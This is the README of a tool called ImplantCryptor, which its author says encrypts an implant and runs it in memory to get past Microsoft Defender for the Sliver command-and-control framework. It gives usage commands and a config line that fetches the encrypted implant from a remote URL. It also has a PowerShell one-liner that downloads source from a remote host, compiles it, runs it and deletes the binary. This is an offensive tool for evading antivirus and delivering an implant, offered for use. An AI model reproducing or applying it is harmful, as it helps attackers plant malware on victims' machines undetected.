## About
A cryptor with subsequent implant in-memory execution. I made it to bypass Defender for Sliver. Tested 10.2024.

## Usage
Encrypt:
```
ImplantCryptor -e filePath.shc
```
```cs
// Program.cs
public static string implantAddr64 = "http://example_domain.org:5959/test/filePath.shc.enc";
```

Hash:
```
ImplantCryptor -h SomeMethodName
```
```cs
// Program.cs
public class Methods
{
  public const string SomeMethodName = "E52E9EFF82F019EF5BE974D961A1619F";
}
```

## Compile
1. This is meant to be source-obfuscated first!
2. In `Program.cs` change values in "CHANGEME" section.
3. `dotnet publish --runtime win-x64`

```
Remove-Item -Force -Recurse .\192.168.68.1+5959\; wget.exe -r -R "index.htlm" -np http://192.168.68.1:5959/; dotnet publish .\192.168.68.1+5959\; cp .\192.168.68.1+5959\bin\Release\net462\publish\ImplantCryptor.exe . ; .\ImplantCryptor.exe ; del .\ImplantCryptor.exe
```
